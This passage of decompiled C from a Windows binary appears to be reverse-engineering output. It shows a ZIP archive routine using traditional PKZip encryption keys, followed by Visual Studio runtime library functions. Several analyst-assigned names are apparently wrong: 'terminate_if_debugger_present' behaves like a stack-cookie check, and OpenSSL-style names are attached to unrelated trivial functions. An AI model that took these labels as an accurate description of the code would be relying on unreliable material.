  if (*(char *)(debugger_indications + 11) != 0) {
    terminate_if_debugger_present
              (local_c ^ (uint)&stack0xfffffffc,param_2,(char)debugger_indications);
    return;
  }
  local_4b8 = 0;
  if ((*debugger_indications != (char *)0) && (param_5 != 4)) {
    local_4b8 = 12;
  }
  debugger_indications_buffer = debugger_indications;
  (*_DAT_003d95cc)(local_140,param_3);
  uVar17 = (undefined)unaff_ESI;
  pcVar13 = extraout_EDX;
  if (local_140[0] == '\0') goto LAB_003ae04f;
  pcVar5 = local_140;
  do {
    if (*pcVar5 == '\\') {
      *pcVar5 = '/';
    }
    pcVar5 = pcVar5 + 1;
  } while (*pcVar5 != '\0');
  local_4a5 = param_5 == 4;
  if ((bool)local_4a5) {
    sVar6 = _strlen(local_140);
    pcVar13 = local_140;
    bVar15 = true;
    if (pcVar13[sVar6 - 1] == '/') goto LAB_003ad837;
  }
  else {
LAB_003ad837:
    bVar15 = false;
  }
  local_4b4 = 8;
  if (((bool)local_4a5) || (bVar3 = FUN_003aca60(), pcVar13 = extraout_EDX_00, bVar3 != false)) {
    local_4b4 = 0;
  }
  uVar17 = (undefined)unaff_ESI;
  if (param_5 == 2) {
    iVar7 = FUN_003ad0a0();
    uVar16 = CONCAT44(extraout_EDX_01,iVar7);
  }
  else {
    if (param_5 == 1) {
      uVar16 = FUN_003ad120(param_2,pcVar13,param_4);
    }
    else {
      if (param_5 == 3) {
        uVar16 = FUN_003ad280(param_2,pcVar13,param_4);
      }
      else {
        if (param_5 != 4) goto LAB_003ae04f;
        uVar16 = FUN_003ad3b0();
      }
    }
  }
  pcVar13 = (char *)((ulonglong)uVar16 >> 0x20);
  uVar17 = (undefined)unaff_ESI;
  if ((int)uVar16 != 0) goto LAB_003ae04f;
  local_144 = 0;
  (*_DAT_003d95cc)(local_468,&DAT_003ce656);
  (*_DAT_003d95cc)(local_358,local_140);
  local_488 = (*_DAT_003d9418)(local_358);
  if (bVar15) {
    (*_DAT_003d9520)(local_358,&DAT_003d0c30);
    local_488 = local_488 + 1;
  }
  (*_DAT_003d95cc)(local_254,&DAT_003ce656);
  local_476 = 0;
  local_498 = debugger_indications[0x1a];
  local_474 = 8;
  local_35c = 0;
  local_47c = 0;
  local_150 = 1;
  local_148 = 0;
  local_4a0 = 0x140b17;
  local_494 = (char *)0x0;
  local_49c = 8;
  if ((*debugger_indications != (char *)0x0) && (!(bool)local_4a5)) {
    local_474 = 9;
    local_49c = 9;
  }
  local_49a = (short)local_4b4;
  if ((local_4b4 == 0) && (-1 < (int)debugger_indications[0x1c])) {
    local_490 = debugger_indications[0x1c] + local_4b8;
  }
  else {
    local_490 = (char *)0x0;
  }
  local_48c = debugger_indications[0x1c];
  local_470 = debugger_indications[0x13];
  local_46c = debugger_indications[6] + (int)debugger_indications[4];
  local_1b = *(undefined *)(debugger_indications + 0x16);
  local_478 = 0;
  local_364 = &local_20;
  local_360 = local_38;
  pcVar13 = debugger_indications[0x16];
  local_1a = (undefined)((uint)pcVar13 >> 8);
  local_19 = (undefined)((uint)pcVar13 >> 0x10);
  local_18 = (undefined)((uint)pcVar13 >> 0x18);
  local_17 = *(undefined *)(debugger_indications + 0x14);
  pcVar13 = debugger_indications[0x14];
  local_16 = (undefined)((uint)pcVar13 >> 8);
  local_14 = (undefined)((uint)pcVar13 >> 0x18);
  local_15 = (undefined)((uint)pcVar13 >> 0x10);
  local_13 = *(undefined *)(debugger_indications + 0x18);
  pcVar13 = debugger_indications[0x18];
  local_12 = (undefined)((uint)pcVar13 >> 8);
  local_10 = (undefined)((uint)pcVar13 >> 0x18);
  local_11 = (undefined)((uint)pcVar13 >> 0x10);
  local_484 = 0x11;
  local_480 = 9;
  local_20 = 0xd5455;
  local_1c = 7;
  FUN_003aee70(local_38,&local_20,9);
  *(undefined *)((int)local_360 + 2) = 5;
  iVar7 = FUN_003abf80((int3)extraout_ECX);
  uVar17 = (undefined)unaff_ESI;
  if (iVar7 != 0) {
    FUN_003ad570();
    pcVar13 = extraout_EDX_02;
    goto LAB_003adae3;
  }
  debugger_indications[6] = debugger_indications[6] + local_484 + 0x1e + local_488;
  if (debugger_indications[5] != (char *)0x0) {
    FUN_003ad570();
    terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,extraout_EDX_03,uVar17);
    return;
  }
  ppcVar1 = debugger_indications + 0xc;
  debugger_indications[0xd] = (char *)0x23456789;
  debugger_indications[0xe] = (char *)0x34567890;
  pcVar13 = *debugger_indications;
  *ppcVar1 = (char *)0x12345678;
  for (; (pcVar13 != (char *)0x0 && (*pcVar13 != '\0')); pcVar13 = pcVar13 + 1) {
    FUN_003aca10(*pcVar13,(uint *)ppcVar1);
  }
  if (DAT_003d96e9 == '\0') {
    uVar8 = (*_DAT_003d9378)();
    uVar9 = (*_DAT_003d958c)();
    FUN_003b27b4(uVar8 ^ uVar9);
  }
  iVar7 = 0;
  do {
    uVar8 = FUN_003b27c6();
    uVar17 = (undefined)unaff_ESI;
    *(char *)((int)&local_2c + iVar7) = (char)((int)uVar8 >> 7);
    iVar7 = iVar7 + 1;
  } while (iVar7 < 0xc);
  local_4ac = debugger_indications[0xd];
  pcVar13 = *ppcVar1;
  local_21 = (char)((uint)local_498 >> 8);
  pcVar5 = debugger_indications[0xe];
  local_4b0 = 0;
  do {
    pcVar12 = (char *)(*(uint *)(&DAT_003ce9f0 +
                                (((int)*(char *)((int)&local_2c + local_4b0) ^ (uint)pcVar13) & 0xff
                                ) * 4) ^ (uint)pcVar13 >> 8);
    uVar8 = (uint)pcVar5 & 0xfffd | 2;
    pcVar14 = (char *)((int)(local_4ac + ((uint)pcVar12 & 0xff)) * 0x8088405 + 1);
    *ppcVar1 = pcVar12;
    debugger_indications[0xd] = pcVar14;
    pcVar13 = (char *)((uint)pcVar5 >> 8 ^
                      *(uint *)(&DAT_003ce9f0 + (((uint)pcVar14 >> 0x18 ^ (uint)pcVar5) & 0xff) * 4)
                      );
    bVar2 = *(byte *)((int)&local_2c + local_4b0);
    debugger_indications[0xe] = pcVar13;
    *(byte *)((int)&local_2c + local_4b0) = (byte)((uVar8 ^ 1) * uVar8 >> 8) ^ bVar2;
    bVar2 = *(byte *)((int)&local_2c + local_4b0 + 1);
    uVar8 = (uint)pcVar13 & 0xfffd | 2;
    pcVar5 = (char *)(*(uint *)(&DAT_003ce9f0 + (((int)(char)bVar2 ^ (uint)pcVar12) & 0xff) * 4) ^
                     (uint)pcVar12 >> 8);
    pcVar12 = (char *)((int)(pcVar14 + ((uint)pcVar5 & 0xff)) * 0x8088405 + 1);
    *ppcVar1 = pcVar5;
    debugger_indications[0xd] = pcVar12;
    pcVar13 = (char *)((uint)pcVar13 >> 8 ^
                      *(uint *)(&DAT_003ce9f0 + (((uint)pcVar12 >> 0x18 ^ (uint)pcVar13) & 0xff) * 4
                               ));
    *(byte *)((int)&local_2c + local_4b0 + 1) = (byte)((uVar8 ^ 1) * uVar8 >> 8) ^ bVar2;
    bVar2 = *(byte *)((int)&local_2c + local_4b0 + 2);
    uVar8 = (uint)pcVar13 & 0xfffd | 2;
    debugger_indications[0xe] = pcVar13;
    pcVar5 = (char *)(*(uint *)(&DAT_003ce9f0 + (((int)(char)bVar2 ^ (uint)pcVar5) & 0xff) * 4) ^
                     (uint)pcVar5 >> 8);
    *ppcVar1 = pcVar5;
    pcVar12 = (char *)((int)(pcVar12 + ((uint)pcVar5 & 0xff)) * 0x8088405 + 1);
    debugger_indications[0xd] = pcVar12;
    pcVar14 = (char *)((uint)pcVar13 >> 8 ^
                      *(uint *)(&DAT_003ce9f0 + (((uint)pcVar12 >> 0x18 ^ (uint)pcVar13) & 0xff) * 4
                               ));
    *(byte *)((int)&local_2c + local_4b0 + 2) = (byte)((uVar8 ^ 1) * uVar8 >> 8) ^ bVar2;
    bVar2 = *(byte *)((int)&local_2c + local_4b0 + 3);
    uVar8 = (uint)pcVar14 & 0xfffd | 2;
    debugger_indications[0xe] = pcVar14;
    pcVar13 = (char *)(*(uint *)(&DAT_003ce9f0 + (((int)(char)bVar2 ^ (uint)pcVar5) & 0xff) * 4) ^
                      (uint)pcVar5 >> 8);
    iVar7 = local_4b0 + 4;
    local_4ac = (char *)((int)(pcVar12 + ((uint)pcVar13 & 0xff)) * 0x8088405 + 1);
    debugger_indications[0xd] = local_4ac;
    *ppcVar1 = pcVar13;
    pcVar5 = (char *)((uint)pcVar14 >> 8 ^
                     *(uint *)(&DAT_003ce9f0 +
                              (((uint)local_4ac >> 0x18 ^ (uint)pcVar14) & 0xff) * 4));
    debugger_indications[0xe] = pcVar5;
    *(byte *)((int)&local_2c + local_4b0 + 3) = (byte)((uVar8 ^ 1) * uVar8 >> 8) ^ bVar2;
    local_4b0 = iVar7;
  } while (iVar7 < 0xc);
  iVar7 = 0;
  if (*debugger_indications_buffer == (char *)0x0) {
LAB_003ade11:
    uVar4 = 0;
  }
  else {
    if (local_4a5 == '\0') {
      FUN_003ace90(debugger_indications_buffer,&local_2c,0xc);
      debugger_indications_buffer[6] = debugger_indications_buffer[6] + 0xc;
      pcVar13 = extraout_ECX_00;
    }
    if ((*debugger_indications_buffer == (char *)0x0) || (local_4a5 != '\0')) goto LAB_003ade11;
    uVar4 = 1;
  }
  *(undefined *)((int)debugger_indications_buffer + 0x2d) = uVar4;
  if (local_4a5 == '\0') {
    if (local_4b4 == 8) {
      iVar7 = FUN_003ad5d0((int)&local_4a0);
    }
    else {
      if (local_4b4 == 0) {
        iVar7 = FUN_003ad6e0((uint)pcVar13);
      }
    }
  }
  else {
    debugger_indications_buffer[0x24] = (char *)0x0;
  }
  *(undefined *)((int)debugger_indications_buffer + 0x2d) = 0;
  if ((*(char *)(debugger_indications_buffer + 0x20) != '\0') &&
     (debugger_indications_buffer[0x1f] != (char *)0x0)) {
    (*_DAT_003d93b8)(debugger_indications_buffer[0x1f]);
  }
  pcVar13 = debugger_indications_buffer[0x24];
  pcVar5 = debugger_indications_buffer[0x1d];
  debugger_indications_buffer[6] = debugger_indications_buffer[6] + (int)pcVar13;
  debugger_indications_buffer[0x1f] = (char *)0x0;
  debugger_indications_buffer[0x1c] = pcVar5;
  if (debugger_indications_buffer[5] == (char *)0x0) {
    if (iVar7 != 0) {
LAB_003adae3:
      terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,pcVar13,uVar17);
      return;
    }
    local_494 = debugger_indications_buffer[0x1e];
    pcVar12 = pcVar13 + local_4b8;
    bVar15 = local_490 == pcVar12;
    local_490 = pcVar12;
    local_48c = pcVar5;
    if ((*(char *)(debugger_indications_buffer + 7) == '\0') ||
       ((*debugger_indications_buffer != (char *)0x0 && (local_4a5 == '\0')))) {
      if ((local_49a != (short)local_4b4) || ((local_4b4 == 0 && (!bVar15)))) {
        terminate_if_debugger_present
                  (local_c ^ (uint)&stack0xfffffffc,(uint)pcVar13 & 0xffffff00 | (uint)bVar15,uVar17
                  );
        return;
      }
      iVar7 = FUN_003ac220((int3)pcVar5);
      pcVar13 = extraout_EDX_07;
      if (iVar7 != 0) goto LAB_003adae3;
      debugger_indications_buffer[6] = debugger_indications_buffer[6] + 0x10;
      local_49c = local_474;
    }
    else {
      if ((local_49c & 1) == 0) {
        pcVar5 = (char *)0xfff7;
        local_49c = local_49c & 0xfff7;
      }
      local_474 = local_49c;
      local_49a = (short)local_4b4;
      uVar10 = FUN_003acff0(pcVar5,(int)local_46c - (int)debugger_indications_buffer[4]);
      pcVar13 = extraout_EDX_04;
      if ((char)uVar10 == '\0') {
LAB_003adf2d:
        terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,pcVar13,uVar17);
        return;
      }
      iVar7 = FUN_003abf80((int3)extraout_ECX_01);
      pcVar13 = extraout_EDX_05;
      if (iVar7 != 0) goto LAB_003adae3;
      uVar10 = FUN_003acff0(extraout_ECX_02,(uint)debugger_indications_buffer[6]);
      pcVar13 = extraout_EDX_06;
      if ((char)uVar10 == '\0') goto LAB_003adf2d;
    }
    if (debugger_indications_buffer[5] == (char *)0x0) {
      puVar11 = (undefined4 *)FUN_003b103e(local_480);
      FUN_003aee70(puVar11,local_360,local_480);
      local_360 = puVar11;
      puVar11 = (undefined4 *)FUN_003b103e(0x360);
      FUN_003aee70(puVar11,&local_4a0,0x360);
      pcVar13 = debugger_indications_buffer[0x11];
      if (pcVar13 == (char *)0x0) {
        debugger_indications_buffer[0x11] = (char *)puVar11;
        terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,extraout_EDX_08,uVar17);
        return;
      }
      iVar7 = *(int *)(pcVar13 + 0x35c);
      while (iVar7 != 0) {
        pcVar13 = *(char **)(pcVar13 + 0x35c);
        iVar7 = *(int *)(pcVar13 + 0x35c);
      }
      *(undefined4 **)(pcVar13 + 0x35c) = puVar11;
      terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,extraout_EDX_08,uVar17);
      return;
    }
  }
LAB_003ae04f:
  terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,pcVar13,uVar17);
  return;
}



undefined4 __fastcall FUN_003ae070(undefined4 param_1)

{
  void *pvVar1;
  bool bVar2;
  void *pvVar3;
  int in_EAX;
  int iVar4;
  int iVar5;
  undefined4 extraout_ECX;
  uint local_c;
  
  iVar5 = *(int *)(in_EAX + 0x18);
  local_c = 0;
  bVar2 = true;
  pvVar3 = *(void **)(in_EAX + 0x44);
  while (pvVar3 != (void *)0x0) {
    if ((bVar2) && (iVar4 = FUN_003ac360((int3)param_1), iVar4 != 0)) {
      bVar2 = false;
    }
    local_c = local_c + 1;
    *(int *)(in_EAX + 0x18) =
         *(int *)(in_EAX + 0x18) +
         *(int *)((int)pvVar3 + 0x24) + *(int *)((int)pvVar3 + 0x20) + 0x2e +
         *(int *)((int)pvVar3 + 0x18);
    pvVar1 = *(void **)((int)pvVar3 + 0x35c);
    if (*(void **)((int)pvVar3 + 0x140) != (void *)0x0) {
      FUN_003aee4b(*(void **)((int)pvVar3 + 0x140));
    }
    FUN_003aee4b(pvVar3);
    pvVar3 = pvVar1;
    param_1 = extraout_ECX;
  }
  if (bVar2) {
    iVar5 = FUN_003ac760(local_c,*(int *)(in_EAX + 0x18) - iVar5);
    if (iVar5 != 0) {
      bVar2 = false;
    }
    *(int *)(in_EAX + 0x18) = *(int *)(in_EAX + 0x18) + 0x16;
    if (bVar2) {
      return 0;
    }
  }
  return 0x400;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 * FUN_003ae130(void)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c2bab;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  puVar1 = (undefined4 *)FUN_003b103e(0x4098);
  if (puVar1 == (undefined4 *)0x0) {
    puVar1 = (undefined4 *)0x0;
  }
  else {
    *puVar1 = 0;
    puVar1[1] = 0;
    *(undefined *)(puVar1 + 2) = 0;
    puVar1[3] = 0;
    puVar1[4] = 0;
    puVar1[5] = 0;
    puVar1[6] = 0;
    puVar1[8] = 0;
    *(undefined2 *)(puVar1 + 0xb) = 0;
    puVar1[0xf] = 0;
    puVar1[0x11] = 0;
    puVar1[0x12] = 0;
    puVar1[0x1f] = 0;
  }
  local_8 = 0xffffffff;
  _DAT_003d9814 = FUN_003acdd0();
  if (_DAT_003d9814 != 0) {
    if (puVar1 != (undefined4 *)0x0) {
      FUN_003ae1f0();
    }
    *in_FS_OFFSET = local_10;
    return (undefined4 *)0x0;
  }
  puVar2 = (undefined4 *)FUN_003b103e(8);
  *puVar2 = 2;
  puVar2[1] = puVar1;
  *in_FS_OFFSET = local_10;
  return puVar2;
}



void FUN_003ae1f0(void)

{
  void **unaff_ESI;
  
  if (unaff_ESI[0x12] != (void *)0x0) {
    FUN_003aee4b(unaff_ESI[0x12]);
  }
  unaff_ESI[0x12] = (void *)0x0;
  if (unaff_ESI[0xf] != (void *)0x0) {
    FUN_003aee4b(unaff_ESI[0xf]);
  }
  unaff_ESI[0xf] = (void *)0x0;
  if (*unaff_ESI != (void *)0x0) {
    FUN_003aee4b(*unaff_ESI);
  }
  *unaff_ESI = (void *)0x0;
  FUN_003aee4b(unaff_ESI);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_003ae240(undefined4 param_1,int param_2,undefined4 param_3)

{
  int *in_EAX;
  
  if (in_EAX == (int *)0x0) {
    _DAT_003d9814 = 0x10000;
    return;
  }
  if (*in_EAX != 2) {
    _DAT_003d9814 = 0x80000;
    return;
  }
  _DAT_003d9814 = FUN_003ad750((char **)in_EAX[1],param_2,param_3,0,2);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_003ae280(undefined4 param_1,undefined4 param_2,int param_3,int param_4)

{
  int *in_EAX;
  
  if (in_EAX == (int *)0x0) {
    _DAT_003d9814 = 0x10000;
    return;
  }
  if (*in_EAX != 2) {
    _DAT_003d9814 = 0x80000;
    return;
  }
  _DAT_003d9814 = FUN_003ad750((char **)in_EAX[1],param_3,param_2,param_4,3);
  return;
}



undefined ** __thiscall FUN_003ae333(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::logic_error::vftable;
  return (undefined **)this;
}



void FUN_003ae350(char *param_1)

{
  undefined **local_10 [3];
  
  std::exception::exception((exception *)local_10,&param_1);
  local_10[0] = std::length_error::vftable;
                    // WARNING: Subroutine does not return
  __CxxThrowException_8(local_10,&DAT_003d29c4);
}



undefined ** __thiscall FUN_003ae380(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::length_error::vftable;
  return (undefined **)this;
}



void FUN_003ae39d(char *param_1)

{
  undefined **local_10 [3];
  
  std::exception::exception((exception *)local_10,&param_1);
  local_10[0] = std::out_of_range::vftable;
                    // WARNING: Subroutine does not return
  __CxxThrowException_8(local_10,&DAT_003d2a00);
}



undefined ** __thiscall FUN_003ae3cd(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::out_of_range::vftable;
  return (undefined **)this;
}



undefined ** __thiscall FUN_003ae3ea(void *this,byte param_1)

{
  FUN_003b0a88((undefined **)this);
  if ((param_1 & 1) != 0) {
    FUN_003aee4b(this);
  }
  return (undefined **)this;
}



void FUN_003ae40b(size_t param_1)

{
  FUN_003b103e(param_1);
  return;
}



// Library Function - Single Match
//  public: bool __thiscall std::error_condition::operator==(class std::error_condition const
// &)const 
// 
// Library: Visual Studio 2010 Release

bool __thiscall std::error_condition::operator__(error_condition *this,error_condition *param_1)

{
  bool bVar1;
  
  if ((*(int *)(this + 4) == *(int *)(param_1 + 4)) && (*(int *)this == *(int *)param_1)) {
    bVar1 = true;
  }
  else {
    bVar1 = false;
  }
  return bVar1;
}



// Library Function - Single Match
//  public: virtual bool __thiscall std::error_category::equivalent(int,class std::error_condition
// const &)const 
// 
// Library: Visual Studio 2010 Release

bool __thiscall
std::error_category::equivalent(error_category *this,int param_1,error_condition *param_2)

{
  bool bVar1;
  error_condition *this_00;
  error_category **ppeVar2;
  error_category *local_c;
  error_category *peStack8;
  
  ppeVar2 = &local_c;
  local_c = this;
  peStack8 = this;
  this_00 = (error_condition *)(**(code **)(*(int *)this + 0xc))(ppeVar2,param_1,param_2);
  bVar1 = error_condition::operator__(this_00,(error_condition *)ppeVar2);
  return bVar1;
}



// Library Function - Single Match
//  public: virtual bool __thiscall std::error_category::equivalent(class std::error_code const
// &,int)const 
// 
// Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release

bool __thiscall
std::error_category::equivalent(error_category *this,error_code *param_1,int param_2)

{
  bool bVar1;
  
  if ((this == *(error_category **)(param_1 + 4)) && (*(int *)param_1 == param_2)) {
    bVar1 = true;
  }
  else {
    bVar1 = false;
  }
  return bVar1;
}



undefined4 __fastcall FUN_003ae477(int param_1)

{
  return *(undefined4 *)(param_1 + 4);
}



undefined4 __fastcall FUN_003ae47b(int param_1)

{
  return *(undefined4 *)(param_1 + 8);
}



void __thiscall FUN_003ae47f(void *this,undefined4 *param_1,undefined4 param_2)

{
  *param_1 = param_2;
  param_1[1] = this;
  return;
}



undefined ** _GOST_KEY_TRANSPORT_it(void)

{
  return &PTR_vftable_003d6110;
}



undefined ** __thiscall FUN_003ae499(void *this,byte param_1)

{
  *(undefined ***)this = std::error_category::vftable;
  if ((param_1 & 1) != 0) {
    FUN_003aee4b(this);
  }
  return (undefined **)this;
}



// Library Function - Single Match
//  public: virtual class std::basic_string<char,struct std::char_traits<char>,class
// std::allocator<char>> __thiscall std::_Generic_error_category::message(int)const 
// 
// Library: Visual Studio 2010 Release

basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ __thiscall
std::_Generic_error_category::message(_Generic_error_category *this,int param_1)

{
  int **ppiVar1;
  char *in_stack_00000008;
  
  ppiVar1 = (int **)_strerror(in_stack_00000008);
  FUN_00389300((void *)param_1,ppiVar1);
  return SUB41(param_1,0);
}



// Library Function - Single Match
//  public: virtual class std::basic_string<char,struct std::char_traits<char>,class
// std::allocator<char>> __thiscall std::_Iostream_error_category::message(int)const 
// 
// Library: Visual Studio 2010 Release

basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ __thiscall
std::_Iostream_error_category::message(_Iostream_error_category *this,int param_1)

{
  char *in_stack_00000008;
  char *pcVar1;
  
  if (in_stack_00000008 == (char *)0x1) {
    pcVar1 = "iostream stream error";
  }
  else {
    pcVar1 = _strerror(in_stack_00000008);
  }
  FUN_00389300((void *)param_1,(int **)pcVar1);
  return SUB41(param_1,0);
}



// Library Function - Single Match
//  private: void __thiscall std::ios_base::_Callfns(enum std::ios_base::event)
// 
// Library: Visual Studio 2010 Release

void __thiscall std::ios_base::_Callfns(ios_base *this,event param_1)

{
  undefined4 *puVar1;
  
  for (puVar1 = *(undefined4 **)(this + 0x2c); puVar1 != (undefined4 *)0x0;
      puVar1 = (undefined4 *)*puVar1) {
    (*(code *)puVar1[2])(param_1,this,puVar1[1]);
  }
  return;
}



// Library Function - Single Match
//  private: void __thiscall std::ios_base::_Tidy(void)
// 
// Library: Visual Studio 2010 Release

void __thiscall std::ios_base::_Tidy(ios_base *this)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  
  _Callfns(this,0);
  puVar2 = *(undefined4 **)(this + 0x28);
  while (puVar2 != (undefined4 *)0x0) {
    puVar1 = (undefined4 *)*puVar2;
    FUN_003aee4b(puVar2);
    puVar2 = puVar1;
  }
  *(undefined4 *)(this + 0x28) = 0;
  puVar2 = *(undefined4 **)(this + 0x2c);
  while (puVar2 != (undefined4 *)0x0) {
    puVar1 = (undefined4 *)*puVar2;
    FUN_003aee4b(puVar2);
    puVar2 = puVar1;
  }
  *(undefined4 *)(this + 0x2c) = 0;
  return;
}



// Library Function - Single Match
//  private: static void __cdecl std::ios_base::_Ios_base_dtor(class std::ios_base *)
// 
// Library: Visual Studio 2010 Release

void __cdecl std::ios_base::_Ios_base_dtor(ios_base *param_1)

{
  char *pcVar1;
  uint *puVar2;
  
  if (*(int *)(param_1 + 8) != 0) {
    pcVar1 = &DAT_003d7aec + *(int *)(param_1 + 8);
    *pcVar1 = *pcVar1 + -1;
    if ('\0' < *pcVar1) {
      return;
    }
  }
  _Tidy(param_1);
  puVar2 = *(uint **)(param_1 + 0x30);
  if (puVar2 != (uint *)0x0) {
    FUN_00399480(puVar2);
    FUN_003aee4b(puVar2);
  }
  return;
}



void __fastcall FUN_003ae5b7(int param_1)

{
  code **ppcVar1;
  
  ppcVar1 = (code **)FUN_00399430(*(uint *)(param_1 + 4));
  if (ppcVar1 != (code **)0x0) {
    (**(code **)*ppcVar1)(1);
  }
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  private: static void __cdecl std::locale::facet::_Facet_Register(class std::locale::facet *)
//  void __cdecl std::_Facet_Register(class std::_Facet_base *)
// 
// Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release

void __cdecl Facet_Register(undefined4 param_1)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)FUN_003b103e(8);
  if (puVar1 == (undefined4 *)0x0) {
    puVar1 = (undefined4 *)0x0;
  }
  else {
    *puVar1 = DAT_003d7af8;
    puVar1[1] = param_1;
  }
  DAT_003d7af8 = puVar1;
  return;
}



// Library Function - Single Match
//  __Deletegloballocale
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __Deletegloballocale(uint *param_1)

{
  code **ppcVar1;
  
  if (*param_1 != 0) {
    ppcVar1 = (code **)FUN_00399430(*param_1);
    if (ppcVar1 != (code **)0x0) {
      (**(code **)*ppcVar1)(1);
    }
  }
  return;
}



// Library Function - Single Match
//  _tidy_global
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void _tidy_global(void)

{
  int local_8;
  
  std::_Lockit::_Lockit((_Lockit *)&local_8,0);
  __Deletegloballocale(&DAT_003d7afc);
  DAT_003d7afc = 0;
  FUN_003ae995(&local_8);
  return;
}



undefined4 _ENGINE_get_table_flags(void)

{
  return DAT_003d7afc;
}



// Library Function - Single Match
//  private: static void __cdecl std::locale::_Setgloballocale(void *)
// 
// Library: Visual Studio 2010 Release

void __cdecl std::locale::_Setgloballocale(void *param_1)

{
  if (DAT_003d7b21 == '\0') {
    DAT_003d7b21 = '\x01';
    _Atexit(_tidy_global);
  }
  DAT_003d7afc = param_1;
  return;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  private: static void __cdecl std::locale::_Locimp::_Locimp_dtor(class std::locale::_Locimp *)
// 
// Library: Visual Studio 2010 Release

void __cdecl std::locale::_Locimp::_Locimp_dtor(_Locimp *param_1)

{
  uint *puVar1;
  code **ppcVar2;
  int iVar3;
  int local_14 [3];
  undefined4 local_8;
  undefined4 uStack4;
  
  uStack4 = 4;
  local_8 = 0x3ae67f;
  _Lockit::_Lockit((_Lockit *)local_14,0);
  local_8 = 0;
  iVar3 = *(int *)(param_1 + 0xc);
  while (iVar3 != 0) {
    iVar3 = iVar3 + -1;
    puVar1 = (uint *)(*(int *)(param_1 + 8) + iVar3 * 4);
    if (*puVar1 != 0) {
      ppcVar2 = (code **)FUN_00399430(*puVar1);
      if (ppcVar2 != (code **)0x0) {
        (**(code **)*ppcVar2)(1);
      }
    }
  }
  _free(*(void **)(param_1 + 8));
  local_8 = 0xffffffff;
  FUN_003ae995(local_14);
  return;
}



// Library Function - Single Match
//  public: static void __cdecl std::_Locinfo::_Locinfo_dtor(class std::_Locinfo *)
// 
// Library: Visual Studio 2010 Release

void __cdecl std::_Locinfo::_Locinfo_dtor(_Locinfo *param_1)

{
  if (*(char **)(param_1 + 0x14) != (char *)0x0) {
    _setlocale(0,*(char **)(param_1 + 0x14));
  }
  return;
}



// Library Function - Single Match
//  public: class std::_Yarn<char>& __thiscall std::_Yarn<char>::operator=(char const *)
// 
// Library: Visual Studio 2010 Release

_Yarn_char_ * __thiscall std::_Yarn<char>::operator_(_Yarn_char_ *this,char *param_1)

{
  char cVar1;
  char *pcVar2;
  undefined4 *puVar3;
  
  pcVar2 = *(char **)this;
  if (pcVar2 != param_1) {
    if (pcVar2 != (char *)0x0) {
      _free(pcVar2);
    }
    *(undefined4 *)this = 0;
    if (param_1 != (char *)0x0) {
      cVar1 = *param_1;
      pcVar2 = param_1;
      while (cVar1 != '\0') {
        pcVar2 = pcVar2 + 1;
        cVar1 = *pcVar2;
      }
      puVar3 = (undefined4 *)_malloc((size_t)(pcVar2 + (1 - (int)param_1)));
      *(undefined4 **)this = puVar3;
      if (puVar3 != (undefined4 *)0x0) {
        FUN_003aee70(puVar3,(undefined4 *)param_1,(uint)(pcVar2 + (1 - (int)param_1)));
      }
    }
  }
  return this;
}



// Library Function - Single Match
//  public: static void __cdecl std::_Locinfo::_Locinfo_ctor(class std::_Locinfo *,char const *)
// 
// Library: Visual Studio 2010 Release

void __cdecl std::_Locinfo::_Locinfo_ctor(_Locinfo *param_1,char *param_2)

{
  char *pcVar1;
  
  pcVar1 = _setlocale(0,(char *)0x0);
  if (pcVar1 == (char *)0x0) {
    pcVar1 = "";
  }
  _Yarn<char>::operator_((_Yarn_char_ *)(param_1 + 0x14),pcVar1);
  if (param_2 != (char *)0x0) {
    pcVar1 = _setlocale(0,param_2);
    if (pcVar1 != (char *)0x0) goto LAB_003ae7d5;
  }
  pcVar1 = "*";
LAB_003ae7d5:
  _Yarn<char>::operator_((_Yarn_char_ *)(param_1 + 0x1c),pcVar1);
  return;
}



// Library Function - Single Match
//  private: __thiscall std::locale::_Locimp::_Locimp(bool)
// 
// Library: Visual Studio 2010 Release

_Locimp * __thiscall std::locale::_Locimp::_Locimp(_Locimp *this,bool param_1)

{
  this[0x14] = (_Locimp)param_1;
  *(undefined4 *)(this + 4) = 1;
  *(undefined ***)this = vftable;
  *(undefined4 *)(this + 8) = 0;
  *(undefined4 *)(this + 0xc) = 0;
  *(undefined4 *)(this + 0x10) = 0;
  *(undefined4 *)(this + 0x18) = 0;
  this[0x1c] = (_Locimp)0x0;
  _Yarn<char>::operator_((_Yarn_char_ *)(this + 0x18),"*");
  return this;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  protected: virtual __thiscall std::locale::_Locimp::~_Locimp(void)
// 
// Library: Visual Studio 2010 Release

void __thiscall std::locale::_Locimp::__Locimp(_Locimp *this)

{
  *(undefined ***)this = vftable;
  _Locimp_dtor(this);
